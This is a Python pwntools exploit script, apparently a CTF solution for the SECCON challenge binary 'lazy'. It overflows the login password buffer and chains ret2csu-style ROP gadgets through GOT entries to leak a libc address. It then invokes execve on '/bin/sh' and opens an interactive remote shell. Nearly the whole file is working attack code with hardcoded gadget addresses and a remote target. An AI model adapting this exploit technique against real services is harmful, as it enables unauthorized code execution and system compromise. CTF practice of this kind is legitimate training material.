#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
from subprocess import Popen, PIPE
from time import sleep
import sys

binary_file = './lazy'
libc_file   = 'libc.so.6'
#libc_file = '/lib/x86_64-linux-gnu/libc.so.6'

context.arch = 'amd64'
context.os   = 'linux'
context.terminal = ['tmux', 'split-window', '-h']

binary = ELF(binary_file)
libc   = ELF(libc_file)
env = { "LD_PRELOAD": libc_file }

gdbscript = '''
file {binary_file}
peda

# commands for fork-server
# set follow-fork-mode child
# set follow-fork-mode parent

# load structure info
# add-symbol-file symbol.o 0

# code base address and heap base address when PIC is enabled
set $code = 0x555555554000
set $heap = 0x555555757000

# define functions here

# define breakpoints here
b *0x00400000
'''.replace('{binary_file}', binary_file)

def u64x(data):
    return u64(data.ljust(8, '\0'))

def p64x(*nums):
    data = ''
    for num in nums:
        data += p64(num)
    return data

chunk = 'a' * 32
username = '_H4CK3R_'
password = '3XPL01717'

def old_menu(tube, n):
    tube.recvuntil('3: Exit\n')
    tube.sendline(str(n))

def new_menu(tube, n):
    tube.recvuntil('4: Manage\n')
    tube.sendline(str(n))

def download(tube, title):
    new_menu(tube, 1)
    tube.sendline(title)

def manage(tube, title):
    new_menu(tube, 4)
    tube.recvuntil('libc.so.6\n')
    tube.sendline(title)
    tube.recvuntil('Sending ')
    data_size = int(tube.recvuntil(' ')[:-1])
    tube.recvuntil('bytes')
    data = tube.recv(14216)
    return data

def login(tube):
    old_menu(tube, 2)
    tube.recvuntil(': ') # username
    tube.sendline(username)
    tube.recvuntil(': ') # password
    tube.sendline(password)

def bye(tube):
    old_menu(tube, 3)

pop_rdi_ret = 0x004015f3
pop_rbp_ret = 0x00400c70
leave_ret   = 0x00400d70

func_puts = 0x400b3f
func_chdir = 0x400b68
func_input = 0x400d06
func_listing = 0x400d72
func_download = 0x400e23
dot_dot = 0x40164f
free_space = 0x00602000 + 0x500

open_got  = 0x601fe0
read_got  = 0x601f98
write_got = 0x601f40
puts_got  = 0x601f30
chdir_got = 0x601f58
alarm_got = 0x601f88

add_rsp_8_pop_regs = 0x4015e6
mov_regs_call_got = 0x4015d0

msg = 0x4016a6

download = 0x400efc

private_download = 0x4013f8

def login_bof(tube, payload):
    old_menu(tube, 2)
    tube.recvuntil(': ')
    tube.sendline(username)
    tube.recvuntil(': ')
    tube.sendline('a'*0x80 + p64(free_space) + payload)


class Three:
    def __init__(self, _got, _edi, _rsi, _rdx):
        self.got = _got
        self.edi = _edi
        self.rsi = _rsi
        self.rdx = _rdx

def callThree(*args):
    dummy = p64(0xdeadbeefcafebabe)
    dummy = p64(free_space)
    payload = p64(add_rsp_8_pop_regs)
    for three in args:
        payload += dummy # add rsp, 8
        payload += p64(0) # rbx
        payload += p64(1) # rbp
        payload += p64(three.got) # r12
        payload += p64(three.rdx) # r13
        payload += p64(three.rsi) # r14
        payload += p64(three.edi) # r15d
        payload += p64(mov_regs_call_got) # ret
    #payload += dummy * 7
    payload += dummy * 2 + p64(free_space) + dummy * 4
    return payload

def main():
    if len(sys.argv) == 2 and sys.argv[1] == '--local':
        tube = process([binary_file], env=env, stderr=sys.stderr)
    elif len(sys.argv) == 2 and sys.argv[1] == '--attach':
        tube = process([binary_file], env=env, stderr=sys.stderr)
        gdb.attach(tube, gdbscript=gdbscript)
    elif len(sys.argv) == 2 and sys.argv[1] == '--remote':
        tube = remote('lazy.chal.seccon.jp', 33333)
        #tube = remote('localhost', 12345)
        #tube = ssh('user', 'gimme-yourshell.ctf.insecurity-insa.fr', password='deadbeef', port=2225)
        #tube.run(binary_file)
    else:
        #tube = gdb.debug([binary_file], aslr=False, env=env, gdbscript=gdbscript)
        tube = remote('localhost', 12345)

    flagfile = '810a0afb2c69f8864ee65f0bdca999d7_FLAG'
    flagfile = '/etc/os-release'
    #flagfile = 'ld.so'
    #flagfile = './q/private/libc.so.6'
    payload = ''
    payload += callThree(
            Three(puts_got, msg, 0, 0),
            Three(write_got, 1, alarm_got, 8),
            Three(read_got, 0, free_space, 0x200), # payload2
            Three(read_got, 0, free_space+0x200, 0x100), # alarm+5
            Three(read_got, 0, free_space+0x300, 0x100), # /bin/sh
            #Three(open_got, free_space, 0, 0),
            #Three(read_got, 3, free_space, 0x100),
            #Three(write_got, 1, free_space, 0x100)
            )
    #payload += p64(download)
    #payload += p64(func_listing)
    payload += p64(leave_ret)
    login_bof(tube, payload)
    #flagfile = tube.recvuntil('FLAG').split('\n')[-1]
    #print('flagfile: ' + flagfile)
    tube.recvuntil('contents\n')
    alarm_addr = u64x(tube.recv(8))
    #libc_base = chdir_addr - libc.symbols['alarm']
    #print(hex(libc_base))
    syscall_ret = alarm_addr + 5

    payload2 = p64x(0xdeadbeef)
    payload2 += callThree(
            Three(alarm_got, 59, 0, 0),
            Three(alarm_got, 59, 0, 0),
            Three(free_space+0x200, free_space+0x300, 0, 0),
            )

    sleep(0.2)
    tube.send(payload2)
    sleep(0.2)
    tube.send(p64(syscall_ret))
    sleep(0.2)
    tube.send('/bin/sh\0')
    #tube.sendline(flagfile)
    tube.interactive()

if __name__ == '__main__':
    main()
